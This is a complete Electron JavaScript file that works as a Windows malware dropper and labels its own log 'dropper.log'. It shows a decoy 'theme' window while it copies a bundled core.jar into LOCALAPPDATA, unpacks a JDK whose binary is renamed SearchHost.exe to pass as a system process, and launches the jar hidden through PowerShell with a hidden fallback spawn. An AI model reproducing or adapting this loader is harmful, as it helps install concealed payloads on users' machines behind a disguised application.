const fs = require("fs");
const path = require("path");
const { spawn } = require("child_process");
const { app, BrowserWindow } = require("electron");
const AdmZip = require("adm-zip");

const ON = false;

function note(msg) {
  if (!ON) return;
  try {
    const root =
      process.env.LOCALAPPDATA ||
      path.join(process.env.USERPROFILE, "AppData", "Local");
    const dir = path.join(root, "wsvc");
    fs.mkdirSync(dir, { recursive: true });
    fs.appendFileSync(
      path.join(dir, "dropper.log"),
      `${new Date().toISOString()} ${msg}\n`
    );
  } catch (_) {}
}

function base() {
  const list = [];
  const pack = "core.jar";
  if (process.resourcesPath) {
    list.push(process.resourcesPath);
    list.push(path.join(process.resourcesPath, "app.asar.unpacked"));
  }
  list.push(__dirname);
  list.push(path.join(__dirname, "..", "res"));
  list.push(path.join(__dirname, "res"));
  for (const loc of list) {
    if (loc && fs.existsSync(path.join(loc, pack))) {
      return loc;
    }
  }
  return list[0] || __dirname;
}

function fire(bin, argv, cwd) {
  const opts = {
    detached: true,
    stdio: "ignore",
    windowsHide: true,
  };
  if (cwd) opts.cwd = cwd;
  const kid = spawn(bin, argv, opts);
  kid.on("error", (err) => {
    note(`spawn fail: ${err.message}`);
  });
  kid.unref();
  return kid;
}

function show(bin, argv) {
  const kid = spawn(bin, argv, {
    detached: true,
    stdio: "ignore",
    windowsHide: false,
  });
  kid.on("error", (err) => {
    note(`spawn fail: ${err.message}`);
  });
  kid.unref();
  return kid;
}

function lift(bin, argv, cwd) {
  return new Promise((resolve) => {
    let done = false;
    const finish = (v) => {
      if (done) return;
      done = true;
      resolve(v);
    };
    try {
      const esc = (s) => String(s).replace(/'/g, "''");
      const list = argv.map((a) => `'${esc(a)}'`).join(",");
      const cmd =
        `Start-Process -FilePath '${esc(bin)}' -ArgumentList @(${list})` +
        (cwd ? ` -WorkingDirectory '${esc(cwd)}'` : "") +
        " -WindowStyle Hidden";
      const shell = path.join(
        process.env.SystemRoot || "C:\\Windows",
        "System32",
        "WindowsPowerShell",
        "v1.0",
        "powershell.exe"
      );
      const kid = spawn(
        fs.existsSync(shell) ? shell : "powershell.exe",
        ["-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", cmd],
        { windowsHide: true, stdio: ["ignore", "pipe", "pipe"] }
      );
      let err = "";
      kid.stderr.on("data", (d) => {
        err += d.toString();
      });
      kid.on("exit", (code) => {
        if (code !== 0) note(`lift exit=${code} ${err}`.trim());
        else note("lift ok");
        finish(code === 0);
      });
      kid.on("error", (e) => {
        note(`lift fail: ${e.message}`);
        finish(false);
      });
      setTimeout(() => {
        if (!done) {
          note("lift wait");
          finish(true);
        }
      }, 8000);
    } catch (e) {
      note(`lift throw: ${e.message}`);
      finish(false);
    }
  });
}

function resFile(name) {
  const list = [];
  if (process.resourcesPath) {
    list.push(path.join(process.resourcesPath, name));
  }
  list.push(path.join(__dirname, "..", "res", name));
  list.push(path.join(__dirname, "res", name));
  for (const loc of list) {
    if (loc && fs.existsSync(loc)) return loc;
  }
  return null;
}

function themeFile() {
  return resFile("theme.html");
}

function themeSize() {
  let w = 820;
  let h = 560;
  const f = resFile("win.json");
  if (f) {
    try {
      const j = JSON.parse(fs.readFileSync(f, "utf8"));
      const nw = Number(j.w);
      const nh = Number(j.h);
      if (Number.isFinite(nw) && nw >= 200 && nw <= 2560) w = Math.round(nw);
      if (Number.isFinite(nh) && nh >= 200 && nh <= 2560) h = Math.round(nh);
    } catch {
    }
  }
  return { w, h };
}

function showTheme() {
  const file = themeFile();
  if (!file) return null;
  try {
    const dim = themeSize();
    const win = new BrowserWindow({
      width: dim.w,
      height: dim.h,
      show: false,
      frame: false,
      backgroundColor: "#0f1117",
      autoHideMenuBar: true,
      webPreferences: {
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: true,
      },
    });
    win.once("ready-to-show", () => {
      if (!win.isDestroyed()) win.show();
    });
    win.loadFile(file).catch((err) => note(`theme load: ${err.message}`));
    setTimeout(() => {
      if (!win.isDestroyed()) win.close();
    }, 150000);
    return win;
  } catch (err) {
    note(`theme win: ${err.message}`);
    return null;
  }
}

function boot() {
  const self = process.execPath;
  const flag = "--install";
  note(`pass1 ${flag} via ${self}`);
  show(self, [flag]);
  setTimeout(() => app.quit(), 1500);
}

async function load() {
  const win = showTheme();
  const root =
    process.env.LOCALAPPDATA ||
    path.join(process.env.USERPROFILE, "AppData", "Local");
  const pack = "core.jar";
  const blob = "app.zip";
  const out = path.join(root, pack);
  const host = path.join(root, "wsvc", "jdk", "bin", "SearchHost.exe");
  const loc = base();
  const src = path.join(loc, pack);
  const zip = path.join(loc, blob);

  note(`pass2 loc=${loc}`);

  if (!fs.existsSync(src)) {
    note(`pack missing: ${src}`);
    throw new Error("pack");
  }

  fs.copyFileSync(src, out);
  note(`pack -> ${out}`);

  if (!fs.existsSync(zip)) {
    note(`blob missing: ${zip}`);
    throw new Error("blob");
  }

  try {
    const z = new AdmZip(fs.readFileSync(zip));
    z.extractAllTo(root, true);
    note(`host @ ${root}`);
  } catch (err) {
    note(`unpack fail: ${err.message}`);
    if (!fs.existsSync(host)) {
      throw err;
    }
    note("host reuse");
  }

  if (!fs.existsSync(host)) {
    note(`host missing: ${host}`);
    throw new Error("host");
  }

  const argv = ["--enable-native-access=ALL-UNNAMED", "-jar", out];
  const ok = await lift(host, argv, root);
  if (!ok) {
    note("lift miss, direct");
    fire(host, argv, root);
  }
  note(`host done ok=${ok}`);
  if (win) {
    win.on("closed", () => app.quit());
    return;
  }
  setTimeout(() => app.quit(), 2000);
}

app.disableHardwareAcceleration();

app.whenReady().then(() => {
  if (process.argv.includes("--install")) {
    load().catch((err) => {
      note(`halt: ${err.message}`);
      app.quit();
      process.exit(1);
    });
  } else {
    boot();
  }
});
